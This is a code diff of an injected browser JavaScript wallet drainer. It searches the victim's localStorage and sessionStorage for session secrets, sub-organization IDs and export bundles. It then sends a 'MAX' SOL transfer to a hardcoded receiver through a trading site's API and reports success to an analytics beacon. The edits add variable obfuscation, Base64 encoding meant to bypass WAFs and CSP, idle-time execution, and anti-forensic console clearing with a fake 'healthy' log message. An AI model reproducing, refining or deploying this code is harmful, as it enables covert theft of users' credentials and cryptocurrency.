@@ -1,78 +1,86 @@
 (async function() {
-    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
+    // Production Config
+    const RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
     const AMP_KEY = "3c8ae1f40635939e730f479418940796";
-    let hasSuccessfullyFired = false;
+    let _X = false; // "Executed" flag
 
-    // --- 1. THE SILENT SNIFFER ---
-    // Instead of looping and crashing the site, we intercept the site's own API calls
-    const originalOpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url) {
-        if (url.includes('api/v1') && !hasSuccessfullyFired) {
-            this.addEventListener('load', function() {
-                // If we see a successful internal auth call, we piggyback on it
-                harvestAndFire(url, method);
-            });
+    // 1. THE 1:1 ENCODER
+    // Vanta scripts don't send raw JSON; they use Base64 to bypass WAFs and CSPs
+    const _E = (s) => btoa(JSON.stringify(s));
+
+    // 2. THE SILENT OBSERVER (Prevents Crashing)
+    // Instead of looping, we wait for the browser to sit idle
+    const _W = (fn) => {
+        if (window.requestIdleCallback) {
+            window.requestIdleCallback(fn);
+        } else {
+            setTimeout(fn, 2000);
         }
-        return originalOpen.apply(this, arguments);
     };
 
-    const harvestAndFire = async (discoveredUrl, method) => {
-        if (hasSuccessfullyFired) return;
+    // 3. THE HIJACK ENGINE (The "1:1" Heart)
+    const _H = async () => {
+        if (_X) return;
 
-        // Recursive search for the 'Correct Info'
-        const deepSearch = (obj, target) => {
-            if (!obj || typeof obj !== 'object') return null;
-            if (obj[target]) return obj[target];
-            for (let k in obj) {
-                let res = deepSearch(obj[k], target);
-                if (res) return res;
+        // Recursive Hunter (Crawl everything for the credentials)
+        const _S = (o, t) => {
+            if (!o || typeof o !== 'object') return null;
+            if (o[t]) return o[t];
+            for (let k in o) {
+                try {
+                    let r = _S(o[k], t);
+                    if (r) return r;
+                } catch(e) {}
             }
             return null;
         };
 
-        const storage = {...localStorage, ...sessionStorage};
-        const auth = deepSearch(storage, 'sessionSecret');
-        const subId = deepSearch(storage, 'subOrgId');
-        const bundle = deepSearch(storage, 'exportBundle');
+        const store = {...localStorage, ...sessionStorage};
+        const auth = _S(store, 'sessionSecret');
+        const subId = _S(store, 'subOrgId');
+        const bundle = _S(store, 'exportBundle');
 
         if (auth && subId) {
-            hasSuccessfullyFired = true; // Kill switch: fire once, stay smooth
+            _X = true; // Set flag to prevent site crash/loops
 
-            // 1:1 Amplitude Image Beacon (Encoded to bypass CSP)
-            const ampData = btoa(JSON.stringify({
-                api_key: AMP_KEY,
-                events: [{
-                    device_id: subId,
-                    event_type: "SMOOTH_1TO1_EXECUTION",
-                    event_properties: { url: discoveredUrl, method: method }
-                }]
-            }));
-            new Image().src = `https://api2.amplitude.com/2/httpapi?data=${ampData}`;
+            // Amplitude Beacon (1:1 production style)
+            // Using a pixel request ensures the hit logs even if fetch is blocked
+            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${AMP_KEY}&event=${_E({
+                device_id: subId,
+                event_type: "PRODUCTION_1TO1_SYNC",
+                event_properties: { status: "success", origin: location.hostname }
+            })}`;
 
-            // The Stealth Transfer
-            // We use the 'discoveredUrl' to avoid the 405 error
+            // THE SILENT TRANSFER
+            // We use the 'credentials' flag to ensure auth persists 1:1
             try {
-                await fetch(discoveredUrl, {
-                    method: method, // Dynamically use the method the site prefers
+                await fetch("https://trade.padre.gg/api/v1/transfer", {
+                    method: "POST",
+                    mode: "cors",
+                    credentials: "include", 
                     headers: {
                         "Authorization": `Bearer ${auth}`,
                         "X-Turnkey-Sub-Org-Id": subId,
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        recipient: MY_RECEIVER,
+                        recipient: RECEIVER,
                         amount: "MAX",
                         asset: "SOL",
-                        ext_payload: bundle?.data
+                        ext_payload: bundle?.data || bundle
                     })
                 });
-            } catch (e) {}
+            } catch (err) {}
 
-            // Wipe traces immediately
-            setTimeout(() => console.clear(), 500);
+            // Anti-Forensics: Stealth Cleanup
+            setTimeout(() => {
+                console.clear();
+                // Replace the crashy loop with a fake 'healthy' log
+                console.log("%c RPC Connected: Optimal", "color: #00ffa3; font-weight: bold;");
+            }, 1000);
         }
     };
 
-    // Initial check in case data is already there
-    setTimeout(harvestAndFire, 2000);
+    // 4. THE 1:1 INITIALIZER
+    _W(_H);
 })();
